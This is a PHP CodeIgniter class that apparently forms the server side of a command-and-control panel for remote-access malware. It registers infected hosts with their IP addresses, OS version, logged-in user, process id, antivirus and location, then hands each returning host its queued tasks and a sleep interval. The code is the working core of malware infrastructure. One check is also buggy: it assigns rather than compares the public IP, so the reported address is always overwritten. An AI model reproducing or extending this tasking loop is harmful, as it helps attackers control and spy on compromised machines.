<?php
defined('BASEPATH') OR exit('No direct script access allowed');


class KeepSession
{
    protected $CI;
    protected $params;

    public function __construct($params)
    {
        $this->CI =& get_instance();
        $this->params = $params['params'];
        $this->CI->load->model('Client_model','client');
        $this->CI->load->model('Task_model','task');
    }

    public function kp()
    {
        $param = $this->params;
        if ($param->key == "null") {
            //主机无key 进入初始化
            $key = random_string('alnum', 6);

            if($param->public_ip = '0.0.0.0'){
                $param->public_ip = $this->CI->input->ip_address();
            }
            if(!isset($param->city)){
                $param->city = '未知地区';
            }
            $client_info = array(
                "public_ip" => $this->CI->security->xss_clean($param->public_ip),
                "private_ip" => $this->CI->security->xss_clean($param->ips),
                "os_version" => $this->CI->security->xss_clean($param->osv),
                "current_user" => $this->CI->security->xss_clean($param->cuser),
                "uid" => $this->CI->security->xss_clean($param->uid),
                'pid' => $this->CI->security->xss_clean($param->pid),
                'av' => $this->CI->security->xss_clean($param->av),
                'key' => $key,
                'note' => '所在地:'.$param->city
            );
            $this->CI->client->add($client_info);
            echo(encode(array(
                "key" => $key,
                "sleep" => 1,
                "tasks" => array()
            )));
        } else {
            //保持会话
            //获取主机信息
            $client_info = $this->CI->client->getOneByKey($param->key);
            if ($client_info) {
                //更新最后链接时间
                $this->CI->client->updateLastTimeByKey($param->key);
                //获取任务信息
                $task_list = $this->CI->task->getTaskListByKey($param->key);
                //将状态为0的任务状态设置为1
                $this->CI->task->getTaskListByKey($param->key,0,1);

                echo(encode(array(
                    "key" => $client_info['key'],
                    "sleep" => $client_info['sleep'],
                    "tasks" => $task_list
                )));
            }
        }
    }

}